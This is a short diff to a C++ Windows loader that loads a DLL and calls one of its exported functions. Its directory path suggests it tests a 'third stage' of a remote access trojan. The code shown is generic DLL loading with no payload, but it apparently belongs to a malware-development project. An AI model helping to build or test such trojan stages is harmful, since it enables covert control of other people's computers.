@@ -2,7 +2,7 @@
 #include <windows.h>
 #include <iostream>
 
-LPCSTR dllPath = "C:\\malware\\RAT Windows\\test\\func\\new 3rd stage\\target_script.dll";
+LPCSTR dllPath = "C:\\malware\\RAT Windows\\test\\func\\new 3rd stage\\target_code.dll";
 
 typedef int (*pmain_stuff)();
 pmain_stuff main_stuff;
@@ -10,7 +10,7 @@ pmain_stuff main_stuff;
 int main()
 {
     HINSTANCE hDLL = LoadLibraryA(dllPath);
-    if (hDLL == NULL)
+    if (hDLL == nullptr)
     {
         std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
         return 1;
@@ -24,7 +24,7 @@ int main()
         FreeLibrary(hDLL);
         return 1;
     }
-    std::cout << "got path " << std::endl;
+    //std::cout << "got path " << std::endl;
 
     main_stuff();
 
